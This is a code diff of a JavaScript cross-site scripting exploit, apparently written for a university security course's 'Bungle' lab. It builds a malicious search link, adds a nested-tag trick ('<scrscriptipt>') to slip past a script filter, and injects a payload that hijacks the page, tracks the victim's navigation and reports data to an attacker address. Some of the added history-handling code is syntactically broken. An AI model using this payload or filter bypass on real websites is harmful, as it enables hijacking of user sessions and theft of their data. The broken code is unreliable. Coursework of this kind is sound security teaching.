@@ -7,11 +7,14 @@ function makeLink(xssdefense, target, attacker) {
     if (xssdefense == 0) {
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + 
             encodeURIComponent("<script>" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">");
-    } else {
+    } 
         // Implement code to defeat XSS defenses here.
+    else if (xssdefense == 1) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + 
+            encodeURIComponent("<scrscriptipt>" + payload.toString() + ";payload(\"" + attacker + "\");</scrscriptipt" + ">");
+
     }
 }
-
 
 function payload(attacker) {
     function log(attacker, data) { 
@@ -22,6 +25,7 @@ function payload(attacker) {
     function proxy(href,data,replace=0) {
         $("html").hide();
         $("html").load(href,data,function(){
+            history_handler(href,replace);
             $("html").show();
             navlog(href);
             click_case();
@@ -31,20 +35,27 @@ function payload(attacker) {
     function history_handler(href, replace){
             if (!replace) {
                 console.log(window.history);
-                window.history.pushState({url: href}, null, href);
-            } 
+                window.history.pushState({html:  $("html")}, null, href);
+            }
             else {
-                window.history.replaceState({url: href}, null, href);
+                window.history.replaceState({html: null}, null, href);//current state
                 // window.history.pushState({
                 //     url: href}, null, href);
                 console.log("replace = 1")
                 console.log(window.history);
             }
             window.onpopstate = function(event) {//backward
-                proxy(event.state.url, null, 1);//what is 0 not replace??
+                if(event.state.html != null){
+                    event.state.html.load});
+                }
+                //proxy(event.state.url, null, 1);//what if 0 not replace??
                 event.preventDefault();
                 console.log(window.history);
                 };
+            // window.onbeforeunload = function(event){
+
+            //     proxy(event.state.url, null, 1);//what if 0 not 
+            // }
     }
 
     function navlog(href){
@@ -111,12 +122,11 @@ function payload(attacker) {
         });
 
     }
-
     //first time pyload do:
     proxy("./",null,1);
 }
 
-var xssdefense = 0;
+var xssdefense = 1;
 var target = "http://bungle-cs461.cs.illinois.edu/";
 var attacker = "http://127.0.0.1:31337/stolen";
 // similar to onload (window.onload)
